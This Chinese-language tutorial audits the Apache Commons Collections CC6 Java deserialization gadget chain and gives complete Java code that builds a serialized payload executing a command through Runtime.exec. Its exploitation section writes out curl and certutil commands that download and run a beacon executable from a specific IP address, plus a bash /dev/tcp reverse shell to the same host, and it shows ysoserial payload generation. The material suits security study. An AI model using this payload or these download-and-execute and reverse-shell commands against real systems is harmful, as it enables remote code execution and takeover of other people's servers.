[TOC]



# ==ApacheCC6链审计==

## 教材内容

#### 一、代码审计过程

1、在之前的审计中发现ChainedTransformer的transform方法还可以被LazyMap的get方法调用

```
public Object get(Object key) {    // create value for key if key is not currently in the map    if (map.containsKey(key) == false) {        Object value = factory.transform(key);        map.put(key, value);        return value;    }    return map.get(key);}
```

所以只要令factory的值为ChainedTransformer对象，则可以实现调用。而protected final Transformer factory; 则定义了factory是一个类属性，所以只要能够通过构造方法对类属性进行赋值，则可以实现对象的传递。

同时，还需要令 if (map.containsKey(key) == false) 条件满足，则说明Map对象中不能包含对应的Key值，则才会进入If语句中进行调用。

2、接下来寻找谁在调用LazyMap的get方法，通过Find Usage找到了3000多个匹配的地方，其中也包含AnnotationInvocationHandler

![image-20230829021454397](https://gitee.com/ymq_typroa/typroa/raw/main/202308290214485.png)

其实这也是CC1链的一个扩展，但是由于仍然是对AnnotationInvocationHandler进行反序列化，同样不适用于新版本JDK，所以该链不进行审计。

3、接下来继续找，发现Common Collections库中的TiedMapEntry调用了get方法。

![image-20230829022653138](https://gitee.com/ymq_typroa/typroa/raw/main/202308290226251.png)

再继续寻找，谁在调用getValue方法，发现同类中的hashCode方法在调用。

```
public int hashCode() {    Object value = getValue();    return (getKey() == null ? 0 : getKey().hashCode()) ^        (value == null ? 0 : value.hashCode()); }
```

而哪里有hashCode呢，其实在审计UrlDNS链时已经知道了，HashMap就存在hashCode方法，且HashMap本身就重写了readObject，可以较好地实现反序列化和自动调用。所以CC6相对是比较容易理解的，而且不依赖于JDK版本，实用性也很高。目前确定的调用链如下：

```
java.io.ObjectInputStream.readObject()        
	java.util.HashMap.put()        
	java.util.HashMap.hashCode()            
		org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()            
		org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()                
			org.apache.commons.collections.map.LazyMap.get()                    
				org.apache.commons.collections.functors.ChainedTransformer.transform()             
				org.apache.commons.collections.functors.InvokerTransformer.transform()             
					java.lang.reflect.Method.invoke()                            
						java.lang.Runtime.exec()
```

4、编写初步的调用链代码

```
public void test1() throws Exception {    // 前面部分保持一致    Transformer[] transformers = new Transformer[] {            new ConstantTransformer(Runtime.class),            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})    };    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    // 实例化LazyMap，并包裹chainedTransformer    Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);    // 实例化TiedMapEntry，并包裹lazyMap    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "woniu");    // 实例化HashMap，并将TiedMapEntry作为Key进行处理    Map<Object, Object> map = new HashMap<>();    map.put(tiedMapEntry, "woniu");    FileOutputStream fos = new FileOutputStream("./data/apachecc6.ser");    ObjectOutputStream oos = new ObjectOutputStream(fos);    oos.writeObject(map);}
```

上述代码运行时，将会抛出异常，且会自已打开计算器：

```
Exception in thread "main" java.io.NotSerializableException: java.lang.ProcessImpl
```

由于ProcessImpl不能被序列化，所以导致代码抛出异常，那么现在的问题就是要知道哪里会出现ProcessImpl对象。通过调试发现，TiedMapEntry的key为woniu，而其值lazyMap为一个ProcessImpl对象，导致出现异常。所以要避免这种对象的产生，不应该在实例化LazyMap时为其传递chainedTransformer，而是传递一个普通的Transformer对象，使其无法继续调用。

```
Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(null));
```

但是此时并没有将ChainedTransformer对象传入Map中，所以导致反序列化时无法执行命令。所以需要将ChainedTransformer对象进行赋值，为LazyMap的factory属性赋值为ChainedTransformer，而LazyMap的factory属性为protected，不可见，所以需要通过反射进行赋值。

```
Class clazz = lazyMap.getClass();Field factory = clazz.getDeclaredField("factory");factory.setAccessible(true);factory.set(lazyMap, chainedTransformer);
```

然后继续进行反序列化，发现并不能打开计算器。

5、调试代码，发现LazyMap的157行不满足条件，最终导致没有执行ChainedTransformer的transform方法。

![image-20230829040050226](https://gitee.com/ymq_typroa/typroa/raw/main/202308290400276.png)

所以需要将LazyMap实例中的woniu这条Key删除

```
lazyMap.remove("woniu");
```

6、最终完成后的代码为：

```
public void test2() throws Exception {    // 前面部分保持一致    Transformer[] transformers = new Transformer[] {            new ConstantTransformer(Runtime.class),            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})    };    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    // 实例化LazyMap，并包裹chainedTransformer    Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(null));    // 不直接赋值为chainedTransformer    // 实例化TiedMapEntry，并包裹lazyMap    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "woniu");    // 实例化HashMap，并将TiedMapEntry作为Key进行处理    Map<Object, Object> map = new HashMap<>();    map.put(tiedMapEntry, "woniu");    Class clazz = lazyMap.getClass();    Field factory = clazz.getDeclaredField("factory");    factory.setAccessible(true);    factory.set(lazyMap, chainedTransformer);        // 重新为其赋值为chainedTransformer    lazyMap.remove("woniu");    // 删除key    FileOutputStream fos = new FileOutputStream("./data/apachecc6.ser");    ObjectOutputStream oos = new ObjectOutputStream(fos);    oos.writeObject(map);}
```

> CC6解释得比较到位的文章：https://blog.csdn.net/qq_61237064/article/details/127562419
>
> CC3：https://blog.csdn.net/qq_64201116/article/details/128277873

#### 二、反序列化漏洞利用

1、在Windows中

```
curl http://47.96.116.171/http_beacon_64.exe -o D:\\shell.exe & D:\\shell.execertutil.exe -urlcache -f http://47.96.116.171/http_beacon_64.exe D:\\shell.exe & D:\\shell.exe
```

2、在Linux中

```
bash -i >& /dev/tcp/47.96.116.171/8086 0>&1
```

#### 三、使用YsoSerial生成序列化数据

ysoserial工具集合了各种Java反序列化Payload，堪称为Java反序列化利用神器。大体分为生成代码、利用库（工具库）、Payloads库、序列化库 这四大库，网址为：https://github.com/frohoff/ysoserial， 可以下载最新版本，也可以阅读其源代码。

（1）运行java -jar ysoserial.jar，不带任何参数，可以获取到ysoserial的用法和内置的Paylod（JDK1.8版本支持）

![image-20230724233309819](https://gitee.com/ymq_typroa/typroa/raw/main/202308291450991.png)

（2）运行Payload生成序列化数据，再利用Java对序列化数据进行反序列化即可，如：

```java
java -jar ysoserial.jar CommonsCollections1 calc.exe > ysocc1.serjava -jar ysoserial.jar CommonsCollections6 calc.exe > ysocc6.serjava -jar ysoserial.jar URLDNS http://123456.ns.matrika.cn > ysourldns.ser
```